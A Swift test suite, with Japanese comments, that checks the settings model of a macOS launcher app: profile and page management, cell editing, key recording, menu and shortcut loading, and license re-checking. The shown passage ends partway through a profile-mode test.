// 担当: ui-settings
// SettingsModel を、偽物のサービスと一時フォルダの設定で組み立てた本物の NonetController につないで確かめる
import AppKit
import Foundation
import NonetCore
@testable import NonetUI
import SwiftUI
import Testing

@Suite @MainActor struct SettingsModelSelectionTests {
    @Test func startsOnTheGlobalProfile() throws {
        let h = try SettingsHarness()
        #expect(h.model.selectedProfile.isGlobal)
        #expect(h.model.selectedIndex == 0)
        #expect(h.model.selectedCell?.title == "Safari")
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari"])
    }

    @Test func selectingAProfileResetsPageAndCell() throws {
        let h = try SettingsHarness()
        h.model.addPage()
        h.model.selectCell(5)
        #expect(h.model.pageIndex == 1)
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        #expect(h.model.selectedProfile.id == xcode.id)
        #expect(h.model.pageIndex == 0)
        #expect(h.model.selectedIndex == 0)
        #expect(h.model.selectedCell?.title == L10n.core("ビルド"))
        h.model.selectProfile(nil)
        #expect(h.model.selectedProfile.isGlobal)
    }

    @Test func arrowKeysMoveTheSelection() throws {
        let h = try SettingsHarness()
        h.model.selectCell(4)
        h.model.moveSelection(.up)
        #expect(h.model.selectedIndex == 1)
        h.model.moveSelection(.up)
        #expect(h.model.selectedIndex == 1)
        h.model.moveSelection(.right)
        #expect(h.model.selectedIndex == 2)
        h.model.selectCell(nil)
        h.model.moveSelection(.down)
        #expect(h.model.selectedIndex == 0)
        h.model.selectCell(42)
        #expect(h.model.selectedIndex == 8)
    }

    @Test func aDeletedProfileFallsBackToGlobal() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        h.controller.update { $0.removeProfile(id: xcode.id) }
        #expect(h.model.selectedProfile.isGlobal)
    }
}

@Suite @MainActor struct SettingsModelCellTests {
    @Test func clearingACellSavesIt() throws {
        let h = try SettingsHarness()
        h.model.clearCell(at: 0)
        #expect(h.model.selectedCell == nil)
        #expect(try h.saved()?.globalProfile.pages[0].cells[0] == nil)
    }

    @Test func duplicateGoesToTheNextEmptyCell() throws {
        let h = try SettingsHarness()
        let original = try #require(h.model.selectedCell)
        h.model.duplicateCell(at: 0)
        #expect(h.model.selectedIndex == 1)
        let copy = try #require(h.model.selectedCell)
        #expect(copy.id != original.id)
        #expect(copy.title == original.title)
        #expect(copy.action == original.action)
        #expect(h.model.gridMessage == nil)
    }

    @Test func duplicateInAFullProfileExplainsWhy() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        let before = h.controller.configuration
        h.model.duplicateCell(at: 0)
        #expect(h.model.gridMessage != nil)
        #expect(h.controller.configuration == before)
        // ページを足せば空きができる
        h.model.addPage()
        h.model.selectPage(0)
        h.model.duplicateCell(at: 0)
        #expect(h.model.pageIndex == 1)
        #expect(h.model.selectedIndex == 0)
        #expect(h.model.selectedCell?.title == L10n.core("ビルド"))
    }

    @Test func droppingACellSwapsAndFollowsIt() throws {
        let h = try SettingsHarness()
        let profile = h.model.selectedProfile
        let safari = try #require(h.model.selectedCell)
        let payload = SettingsDragPayload.cell(profileID: profile.id, address: CellAddress(page: 0, index: 0))
        #expect(h.model.handleDrop(payload, onto: 4))
        #expect(h.model.selectedIndex == 4)
        #expect(h.model.selectedCell?.id == safari.id)
        #expect(h.model.currentPage.cells[0] == nil)
        #expect(try h.saved()?.globalProfile.pages[0].cells[4]?.id == safari.id)
    }

    @Test func foreignDropsAreRefused() throws {
        let h = try SettingsHarness()
        let before = h.controller.configuration
        let other = SettingsDragPayload.cell(profileID: UUID(), address: CellAddress(page: 0, index: 0))
        #expect(!h.model.handleDrop(other, onto: 4))
        let same = SettingsDragPayload.cell(profileID: h.model.selectedProfile.id, address: CellAddress(page: 0, index: 4))
        #expect(!h.model.handleDrop(same, onto: 4))
        #expect(!h.model.handleDrop(.menuItem(id: "missing"), onto: 4))
        // ページの見出しへ: 同じページ・別のプロファイル・無いページは受け取らない
        #expect(!h.model.handleDrop(same, ontoPage: 0))
        #expect(!h.model.handleDrop(other, ontoPage: 0))
        #expect(!h.model.handleDrop(same, ontoPage: 5))
        #expect(h.controller.configuration == before)
    }

    @Test func emptyCellsAreCreatedFromAKind() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .openURL, at: 1)
        #expect(h.model.selectedIndex == 1)
        #expect(h.model.selectedCell?.action == .openURL(URLAction(url: "")))
        // 埋まっているマスには作らない
        let before = h.controller.configuration
        h.model.createCell(kind: .ai, at: 0)
        #expect(h.controller.configuration == before)
    }

    @Test func switchingKindsKeepsWhatWasTyped() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .script, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.replaceAction(ofCell: id, with: .script(ScriptAction(source: "echo hi", runMode: .terminal)))
        h.model.changeKind(ofCell: id, to: .keystroke)
        #expect(h.model.selectedCell?.action == .keystroke(KeySequence([])))
        h.model.changeKind(ofCell: id, to: .script)
        #expect(h.model.selectedCell?.action == .script(ScriptAction(source: "echo hi", runMode: .terminal)))
        #expect(h.model.selectedCell?.id == id)
    }

    @Test func editsFindTheCellByIDAfterItMoved() throws {
        let h = try SettingsHarness()
        let id = try #require(h.model.selectedCell?.id)
        h.model.swapCells(CellAddress(page: 0, index: 0), CellAddress(page: 0, index: 8))
        h.model.updateCell(id: id) { $0.title = "ブラウザ" }
        #expect(h.model.currentPage.cells[8]?.title == "ブラウザ")
        #expect(try h.saved()?.globalProfile.pages[0].cells[8]?.title == "ブラウザ")
        // 無いマスは何もしない
        let before = h.controller.configuration
        h.model.updateCell(id: UUID()) { $0.title = "x" }
        #expect(h.controller.configuration == before)
    }

    /// アプリのマスを URL に切り替えて ⌘Z で戻し、別の中身にしてから「開く」に戻すと、アプリに戻る（URL にしない）
    @Test func undoingTheAppURLSwitchKeepsTheAppForOpen() throws {
        let h = try SettingsHarness()
        h.model.undoManager.groupsByEvent = false
        let safari = try #require(h.model.selectedProfile.pages[0].cells[0])
        guard case .launchApp = safari.action else { Issue.record("最初のマスはアプリを開く"); return }
        h.model.changeKind(ofCell: safari.id, to: .openURL)
        h.model.closeEditGroup()
        h.model.undoManager.undo()
        #expect(h.model.cell(id: safari.id)?.action == safari.action)
        h.model.replaceAction(ofCell: safari.id, with: .keystroke(KeySequence([KeyChord(.character("b"), modifiers: .command)])))
        h.model.chooseKind(ofCell: safari.id, .launchApp)
        #expect(h.model.cell(id: safari.id)?.action == safari.action)
    }

    @Test func choosingAnAppForALaunchCell() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .launchApp, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.chooseApp(SettingsFixtures.figma, forCell: id)
        let cell = try #require(h.model.selectedCell)
        #expect(cell.title == "Figma")
        #expect(cell.icon == .app(bundleID: SettingsFixtures.figma.bundleID))
        #expect(cell.action == .launchApp(LaunchAppAction(app: SettingsFixtures.figma)))
    }
}

@Suite @MainActor struct SettingsModelMenuTests {
    private func loadFigmaMenus(_ h: SettingsHarness) async {
        h.menus.apps = [SettingsMenuSamples.figma, SettingsMenuSamples.notes]
        h.menus.items = SettingsMenuSamples.figmaMenus
        h.model.showMenus(true)
        h.model.menuBrowser.select(SettingsMenuSamples.figma)
        await h.model.menuBrowser.waitUntilLoaded()
    }

    @Test func droppingAMenuItemAssignsIt() async throws {
        let h = try SettingsHarness()
        await loadFigmaMenus(h)
        let node = MenuItemNode(title: "自動レイアウトを追加", path: ["オブジェクト", "自動レイアウトを追加"], keyEquivalent: .key("a", .shift))
        #expect(h.model.handleDrop(.menuItem(id: node.id), onto: 1))
        let cell = try #require(h.model.selectedCell)
        #expect(h.model.selectedIndex == 1)
        #expect(cell.title == "自動レイアウトを追加")
        #expect(cell.action == .menuItem(MenuItemAction(app: SettingsFixtures.figma, path: node.path, keyEquivalent: node.keyEquivalent)))
        #expect(try h.saved()?.globalProfile.pages[0].cells[1]?.action == cell.action)
    }

    @Test func doubleClickFillsTheFirstEmptyCell() async throws {
        let h = try SettingsHarness()
        await loadFigmaMenus(h)
        let entry = try #require(h.model.menuBrowser.sections.first?.entries.first)
        // 選んでいるマス 0 は埋まっているので、最初の空き（1）へ
        h.model.assignMenuItem(entry.node)
        #expect(h.model.selectedIndex == 1)
        #expect(h.model.selectedCell?.title == "元に戻す")
        // 選んでいる空きマスがあればそこへ
        h.model.selectCell(7)
        h.model.assignMenuItem(entry.node)
        #expect(h.model.selectedIndex == 7)
        #expect(h.model.selectedCell?.action.kind == .menuItem)
    }

    @Test func aFullProfileReportsThatThereIsNoRoom() async throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        await loadFigmaMenus(h)
        let before = h.controller.configuration
        let entry = try #require(h.model.menuBrowser.sections.first?.entries.first)
        h.model.assignMenuItem(entry.node)
        #expect(h.model.gridMessage != nil)
        #expect(h.controller.configuration == before)
    }

    @Test func openingTheMenuPanelPicksTheProfilesApp() async throws {
        let h = try SettingsHarness()
        let xcodeApp = RunningAppInfo(app: SettingsFixtures.xcode, processID: 303)
        h.menus.apps = [SettingsMenuSamples.figma, xcodeApp]
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        h.model.showMenus(true)
        #expect(h.model.rightPanel == .menus)
        #expect(h.model.menuBrowser.selectedApp == xcodeApp)
        await h.model.menuBrowser.waitUntilLoaded()
        #expect(h.menus.requested == [xcodeApp])
        h.model.showMenus(false)
        #expect(h.model.rightPanel == .inspector)
    }
}

@Suite @MainActor struct SettingsModelRecordingTests {
    private func keystrokeCell(_ h: SettingsHarness) throws -> UUID {
        h.model.createCell(kind: .keystroke, at: 1)
        return try #require(h.model.selectedCell?.id)
    }

    @Test func recordsAKeyAndBlocksSessionsMeanwhile() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        #expect(h.controller.isRecordingKeys)
        #expect(h.model.isRecording)
        h.model.handleFlagsChanged(.command)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.finishRecording()
        #expect(!h.controller.isRecordingKeys)
        #expect(!h.model.isRecording)
        #expect(h.model.recordingCellID == nil)
        let cell = try #require(h.model.cell(id: id))
        #expect(cell.action == .keystroke(.key("b", .command)))
        #expect(cell.title == "⌘B")
        #expect(try h.saved()?.globalProfile.pages[0].cells[1]?.action == .keystroke(.key("b", .command)))
    }

    @Test func escapeCancelsWithoutChanges() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.replaceAction(ofCell: id, with: .keystroke(.key("r", .command)))
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.handleKeyDown(keyCode: 0x35, characters: "\u{1B}", flags: [])
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("r", .command)))
    }

    @Test func fourKeysFinishOnTheirOwn() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        for (code, character) in [(UInt16(0x25), "l"), (0x08, "c"), (0x00, "a"), (0x09, "v")] {
            h.model.handleKeyDown(keyCode: code, characters: character, flags: .command)
        }
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.sequence(
            .key("l", .command), .key("c", .command), .key("a", .command), .key("v", .command)
        )))
    }

    @Test func escapeButtonAddsEscape() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.appendEscapeToRecording()
        h.model.finishRecording()
        #expect(h.model.cell(id: id)?.action == .keystroke(.special(.escape)))
    }

    @Test func leavingTheWindowCommitsTheRecording() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.windowDidResignKey()
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
    }

    @Test func selectingAnotherCellCommitsToTheRecordedCell() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.selectCell(0)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
        #expect(h.model.selectedCell?.title == "Safari")
    }

    @Test func closingTheWindowStopsRecordingWithoutKeys() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.windowWillClose()
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(KeySequence([])))
    }

    @Test func clearingTheRecordedCellCancels() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.clearCell(at: 1)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id) == nil)
    }

    @Test func changingKindCancelsRecording() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.changeKind(ofCell: id, to: .openURL)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action.kind == .openURL)
    }

    /// 種類の一覧で URL のマスの「開く」を選び直しても、URL のまま（アプリの空のマスにならない）
    @Test func choosingOpenAgainKeepsAURLCell() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.changeKind(ofCell: id, to: .openURL)
        let url = try #require(h.model.cell(id: id)?.action)
        h.model.chooseKind(ofCell: id, .launchApp)
        #expect(h.model.cell(id: id)?.action == url)
        // ほかの種類は今までどおり切り替わる
        h.model.chooseKind(ofCell: id, .script)
        #expect(h.model.cell(id: id)?.action.kind == .script)
        // 別の種類から「開く」に戻すと、前に使っていた URL に戻る
        h.model.chooseKind(ofCell: id, .launchApp)
        #expect(h.model.cell(id: id)?.action == url)
        // アプリ・URL の切り替えでアプリにしてから、別の中身に差し替えて「開く」に戻すと、アプリになる（前の URL に戻さない）
        h.model.changeKind(ofCell: id, to: .launchApp)
        h.model.replaceAction(ofCell: id, with: .keystroke(KeySequence([KeyChord(.character("b"), modifiers: .command)])))
        h.model.chooseKind(ofCell: id, .launchApp)
        #expect(h.model.cell(id: id)?.action.kind == .launchApp)
    }

    /// 記録中にライセンスのタブへ移って ⌘V を押しても、記録には入らない
    @Test func switchingTabsFinishesTheRecording() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.selectTab(.license)
        #expect(h.model.tab == .license)
        #expect(!h.model.isRecording)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.recordingCellID == nil)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
        h.model.handleKeyDown(keyCode: 0x09, characters: "v", flags: .command)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
    }

    @Test func theWindowsTabsFinishTheRecording() throws {
        _ = NSApplication.shared
        let h = try SettingsHarness()
        let controller = SettingsWindowController(controller: h.controller, license: h.license, services: h.services, links: AppLinks(), onCheckForUpdates: nil)
        controller.autosavesFrame = false
        _ = controller.loadWindow()
        controller.model.createCell(kind: .keystroke, at: 1)
        let id = try #require(controller.model.selectedCell?.id)
        controller.model.beginRecording(cellID: id)
        controller.select(.general)
        #expect(!h.controller.isRecordingKeys)
        #expect(!controller.model.isRecording)
    }

    @Test func creatingACellFromTheContextMenuFinishesTheRecording() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.createCell(kind: .openURL, at: 3)
        #expect(h.model.selectedIndex == 3)
        #expect(h.model.recordingCellID == nil)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
    }

    @Test func clickingOutsideTheRecorderFinishesIt() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        // 「Esc を加える」などのボタンは記録欄の中
        h.model.handleClick(insideRecorder: true)
        #expect(h.model.isRecording)
        // 表示名の欄など、外をクリックした
        h.model.handleClick(insideRecorder: false)
        #expect(!h.model.isRecording)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
        // 記録していないときのクリックは何もしない
        h.model.handleClick(insideRecorder: false)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
    }

    @Test func clickHitTestingUsesTheRecorderArea() {
        _ = NSApplication.shared
        let window = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 400, height: 300), styleMask: [.titled], backing: .buffered, defer: false)
        window.isReleasedWhenClosed = false
        let content = NSView(frame: NSRect(x: 0, y: 0, width: 400, height: 300))
        window.contentView = content
        let area = NSView(frame: NSRect(x: 100, y: 100, width: 150, height: 60))
        content.addSubview(area)
        let other = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 400, height: 300), styleMask: [.titled], backing: .buffered, defer: false)
        other.isReleasedWhenClosed = false
        defer {
            window.close()
            other.close()
        }
        #expect(SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 120, y: 130), of: window))
        #expect(!SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 20, y: 130), of: window))
        #expect(!SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 120, y: 200), of: window))
        #expect(!SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 120, y: 130), of: other))
        #expect(!SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 120, y: 130), of: nil))
        #expect(!SettingsKeyEventMonitor.contains(nil, locationInWindow: NSPoint(x: 120, y: 130), of: window))
    }

    /// 記録が終わる前に種類が変わっていたら、キーで上書きしない
    @Test func aFinishedRecordingDoesNotOverwriteAnotherKind() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.controller.update { configuration in
            configuration.setCell(Cell(id: id, title: "", icon: .symbol("link"), action: .openURL(URLAction(url: "https://example.com"))),
                                  at: CellAddress(page: 0, index: 1), profileID: configuration.globalProfile.id)
        }
        h.model.finishRecording()
        #expect(h.model.cell(id: id)?.action == .openURL(URLAction(url: "https://example.com")))
        #expect(!h.controller.isRecordingKeys)
    }
}

@Suite @MainActor struct SettingsModelEditTests {
    @Test func updatesReadTheCurrentContent() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .script, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.updateAction(ofCell: id, as: ScriptAction.self) { $0.runMode = .terminal }
        h.model.updateAction(ofCell: id, as: ScriptAction.self) { $0.source = "echo hi" }
        #expect(h.model.cell(id: id)?.action == .script(ScriptAction(source: "echo hi", runMode: .terminal)))
        // 自動で付いた名前は中身に合わせる
        #expect(h.model.cell(id: id)?.title == L10n.core("ターミナル"))
    }

    @Test func updatesOfAnotherKindAreIgnored() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .openURL, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.changeKind(ofCell: id, to: .keystroke)
        let before = h.controller.configuration
        // 消えかけの URL 欄から遅れて届いた確定
        h.model.updateAction(ofCell: id, as: URLAction.self) { $0.url = "example.com" }
        #expect(h.controller.configuration == before)
        #expect(h.model.cell(id: id)?.action == .keystroke(KeySequence([])))
    }

    /// 打ちかけの欄は、種類を切り替える前に確定する（切り替えた後には書き戻さない）
    @Test func changingTheKindFlushesTypingFirst() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .shortcut, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        let buffer = SettingsDraftBuffer(value: "", delay: .seconds(60)) { [model = h.model] name in
            model.updateAction(ofCell: id, as: ShortcutAction.self) { $0.name = name }
        }
        buffer.registry = h.model.pendingEdits
        buffer.edit("翻訳")
        h.model.changeKind(ofCell: id, to: .ai)
        #expect(h.model.cell(id: id)?.action.kind == .ai)
        buffer.flush()
        #expect(h.model.cell(id: id)?.action.kind == .ai)
        h.model.changeKind(ofCell: id, to: .shortcut)
        #expect(h.model.cell(id: id)?.action == .shortcut(ShortcutAction(name: "翻訳")))
    }

    @Test func switchingTabsFlushesTyping() throws {
        let h = try SettingsHarness()
        var calls: [String] = []
        let buffer = SettingsDraftBuffer(value: "", delay: .seconds(60)) { calls.append($0) }
        buffer.registry = h.model.pendingEdits
        buffer.edit("x")
        h.model.selectTab(.general)
        #expect(calls == ["x"])
        buffer.edit("xy")
        h.model.windowWillClose()
        #expect(calls == ["x", "xy"])
    }
}

/// 使い回すウィンドウでは onAppear がもう一度呼ばれないので、ウィンドウに戻ったときに読み込みを続ける
@Suite @MainActor struct SettingsModelWindowLifecycleTests {
    @Test func aMenuLoadStoppedByClosingResumesOnReopen() async throws {
        let h = try SettingsHarness()
        let xcodeApp = RunningAppInfo(app: SettingsFixtures.xcode, processID: 303)
        h.menus.apps = [xcodeApp]
        h.menus.items = SettingsMenuSamples.figmaMenus
        h.menus.delayByProcess[303] = .seconds(30)
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        h.model.showMenus(true)
        #expect(h.model.menuBrowser.state == .loading)
        h.model.windowWillClose()
        #expect(h.model.menuBrowser.state == .idle)
        #expect(h.model.menuBrowser.selectedApp == xcodeApp)

        h.menus.delayByProcess[303] = nil
        h.model.windowDidBecomeKey()
        #expect(h.model.menuBrowser.state == .loading)
        await h.model.menuBrowser.waitUntilLoaded()
        #expect(!h.model.menuBrowser.sections.isEmpty)
        // 読み終えた後に戻ってきても読み直さない
        let requests = h.menus.requested.count
        h.model.windowDidBecomeKey()
        await h.model.menuBrowser.waitUntilLoaded()
        #expect(h.menus.requested.count == requests)
    }

    @Test func aShortcutLoadStoppedByClosingResumesOnReopen() async throws {
        let h = try SettingsHarness()
        h.shortcuts.names = ["翻訳"]
        h.model.createCell(kind: .shortcut, at: 1)
        h.model.shortcutList.loadIfNeeded()
        #expect(h.model.shortcutList.state == .loading)
        h.model.windowWillClose()
        #expect(h.model.shortcutList.state == .idle)
        h.model.windowDidBecomeKey()
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.model.shortcutList.state == .loaded(["翻訳"]))
    }

    @Test func newShortcutsAppearAfterComingBack() async throws {
        let h = try SettingsHarness()
        h.shortcuts.names = ["要約"]
        h.model.shortcutList.loadIfNeeded()
        await h.model.shortcutList.waitUntilLoaded()
        // ショートカット.app で作ってから戻ってきた
        h.shortcuts.names = ["要約", "翻訳"]
        h.model.createCell(kind: .shortcut, at: 1)
        h.model.windowDidBecomeKey()
        // 読み直す間も前の一覧を出しておく
        #expect(h.model.shortcutList.state == .loaded(["要約"]))
        #expect(h.model.shortcutList.isRefreshing)
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.model.shortcutList.state == .loaded(["翻訳", "要約"].sorted { $0.localizedStandardCompare($1) == .orderedAscending }))
        #expect(!h.model.shortcutList.isRefreshing)
        #expect(h.shortcuts.loadCount == 2)
    }

    @Test func shortcutsAreNotReadWhileNoShortcutCellIsShown() async throws {
        let h = try SettingsHarness()
        h.model.shortcutList.loadIfNeeded()
        await h.model.shortcutList.waitUntilLoaded()
        h.model.windowDidBecomeKey()
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.shortcuts.loadCount == 1)
        // 次にショートカットのマスを開いたとき（onAppear）に読み直す
        h.model.shortcutList.loadIfNeeded()
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.shortcuts.loadCount == 2)
    }

    @Test func installedAppsAreReadAgainWhenTheListOpens() throws {
        let h = try SettingsHarness()
        h.model.reloadInstalledApps()
        #expect(!h.model.installedApps.contains(SettingsFixtures.terminal))
        h.installed.apps.append(SettingsFixtures.terminal)
        h.model.reloadInstalledApps()
        #expect(h.model.installedApps.contains(SettingsFixtures.terminal))
    }

    @Test func theAddProfileSheetReadsTheAppsEachTime() async throws {
        _ = NSApplication.shared
        let h = try SettingsHarness()
        for _ in 0..<2 {
            let window = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 460, height: 520), styleMask: [.titled], backing: .buffered, defer: false)
            window.isReleasedWhenClosed = false
            window.contentView = NSHostingView(rootView: SettingsAddProfileSheet(model: h.model))
            window.contentView?.layoutSubtreeIfNeeded()
            try await Task.sleep(for: .milliseconds(50))
            window.contentView = nil
            window.close()
        }
        #expect(h.installed.listCount == 2)
    }

    @Test func theLicenseIsCheckedAgainOnReopen() throws {
        let pair = LicenseSigner.generateKeyPair()
        let signer = try LicenseSigner(privateKeyBase64: pair.privateKeyBase64)
        let key = try signer.sign(LicenseInfo(licenseID: "NONET-TEST-2", licensee: "山田 太郎", email: nil, issuedAt: Date(timeIntervalSince1970: 1_800_000_000)))
        let h = try SettingsHarness(verifier: try LicenseVerifier(publicKeyBase64: pair.publicKeyBase64))
        #expect(h.license.entitlement == .trial(daysLeft: 14))
        // 別の経路（初回の案内など）で登録された
        h.licenseStorage.licenseKey = key
        h.model.windowDidBecomeKey()
        guard case .licensed(let info) = h.license.entitlement else {
            Issue.record("読み直していない: \(h.license.entitlement)")
            return
        }
        #expect(info.licensee == "山田 太郎")
    }
}

@Suite @MainActor struct SettingsModelPageTests {
    @Test func addsPagesUpToTheLimit() throws {
        let h = try SettingsHarness()
        h.model.addPage()
        #expect(h.model.selectedProfile.pages.count == 2)
        #expect(h.model.pageIndex == 1)
        h.model.addPage()
        #expect(h.model.pageIndex == 2)
        #expect(!h.model.canAddPage)
        h.model.addPage()
        #expect(h.model.selectedProfile.pages.count == 3)
        #expect(try h.saved()?.globalProfile.pages.count == 3)
    }

    @Test func emptyPagesAreRemovedWithoutAsking() throws {
        let h = try SettingsHarness()
        h.model.addPage()
        h.model.requestRemovePage(1)
        #expect(h.model.confirmation == nil)
        #expect(h.model.selectedProfile.pages.count == 1)
        #expect(h.model.pageIndex == 0)
        #expect(!h.model.canRemovePage)
        // 最後の1ページは消せない
        h.model.requestRemovePage(0)
        #expect(h.model.confirmation == nil)
        #expect(h.model.selectedProfile.pages.count == 1)
    }

    @Test func pagesWithCellsNeedConfirmation() throws {
        let h = try SettingsHarness()
        h.model.addPage()
        h.model.requestRemovePage(0)
        let confirmation = try #require(h.model.confirmation)
        #expect(confirmation == .removePage(profileID: h.model.selectedProfile.id, index: 0))
        #expect(h.model.selectedProfile.pages.count == 2)
        h.model.confirm(confirmation)
        #expect(h.model.confirmation == nil)
        #expect(h.model.selectedProfile.pages.count == 1)
        #expect(h.model.pageIndex == 0)
        #expect(h.model.currentPage.cells.allSatisfy { $0 == nil })
    }

    @Test func selectingAPageOutOfRangeIsIgnored() throws {
        let h = try SettingsHarness()
        h.model.selectPage(2)
        #expect(h.model.pageIndex == 0)
    }
}

@Suite @MainActor struct SettingsModelProfileTests {
    @Test func addingAProfileUsesThePreset() throws {
        let h = try SettingsHarness()
        h.model.isAddingProfile = true
        h.model.addProfile(for: SettingsFixtures.figma)
        #expect(!h.model.isAddingProfile)
        let profile = h.model.selectedProfile
        #expect(profile.app == SettingsFixtures.figma)
        #expect(profile.pages[0].cells.contains { $0 != nil })
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
    }

    @Test func addingAProfileWithoutAPresetIsEmpty() throws {
        let h = try SettingsHarness()
        h.model.addProfile(for: AppReference(bundleID: "com.example.Plain", name: "Plain"))
        #expect(h.model.selectedProfile.name == "Plain")
        #expect(h.model.currentPage.cells.allSatisfy { $0 == nil })
    }

    @Test func addingAnExistingAppSelectsItsProfile() throws {
        let h = try SettingsHarness()
        h.model.addProfile(for: AppReference(bundleID: "COM.APPLE.DT.XCODE", name: "Xcode"))
        #expect(h.model.selectedProfile.id == h.xcodeProfile?.id)
        #expect(h.model.appProfiles.count == 2)
    }

    @Test func deletingAsksFirstAndSelectsTheNextProfile() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        h.model.requestDeleteProfile(xcode.id)
        let confirmation = try #require(h.model.confirmation)
        #expect(confirmation == .deleteProfile(id: xcode.id, name: "Xcode"))
        #expect(h.xcodeProfile != nil)
        h.model.confirm(confirmation)
        #expect(h.xcodeProfile == nil)
        #expect(h.model.selectedProfile.name == "Safari")
        #expect(try h.saved()?.profiles.count == 2)
        // 最後のアプリを消すとグローバルへ
        h.model.deleteProfile(h.model.selectedProfile.id)
        #expect(h.model.selectedProfile.isGlobal)
    }

    @Test func deletingAnotherProfileKeepsTheSelection() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        let safari = try #require(h.safariProfile)
        h.model.selectProfile(safari.id)
        h.model.deleteProfile(xcode.id)
        #expect(h.model.selectedProfile.id == safari.id)
    }

    @Test func theGlobalProfileCannotBeDeleted() throws {
        let h = try SettingsHarness()
        h.model.requestDeleteProfile(h.model.selectedProfile.id)
        #expect(h.model.confirmation == nil)
    }

    @Test func enablingAndReordering() throws {
        let h = try SettingsHarness()
        let safari = try #require(h.safariProfile)
        #expect(safari.mode == .global)
        h.model.setProfileMode(safari.id, .profile)
        #expect(h.safariProfile?.isEnabled == true)
        h.model.setProfileMode(safari.id, .off)
